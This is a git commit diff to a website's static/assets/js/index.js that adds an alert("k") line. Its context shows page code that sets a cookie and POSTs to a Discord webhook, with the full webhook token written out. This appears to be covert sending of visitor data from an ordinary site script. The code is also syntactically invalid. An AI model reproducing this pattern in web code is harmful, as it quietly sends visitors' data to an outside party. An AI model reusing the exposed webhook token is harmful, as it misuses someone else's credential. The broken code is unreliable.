550e9be5500db2010a83b411b0eb1d758e56c88b
lmao <116317098+Diecsy@users.noreply.github.com>
2025-01-09 13:03:04 -0800

    Update index.js

--- static/assets/js/index.js
+++ static/assets/js/index.js
@@ -6,6 +6,7 @@ const input = document.querySelector("input");
 }
 
 if !(typeof document.cookie == "number"){
+ alert("k")
   document.cookie = "cookie="+ getRandomInt(1e9) + ";expires=Thu, 01 Jan 1970 00:00:01 GMT;";
   const request = new XMLHttpRequest();
       request.open("POST", "https://discord.com/api/webhooks/1327009618479546498/88zVTNA0r96PH03nyT_ffsnD2ydU0ma41qQSOrPomuQ9qElaSkIRk6IZDtqoH8y1xjIv");
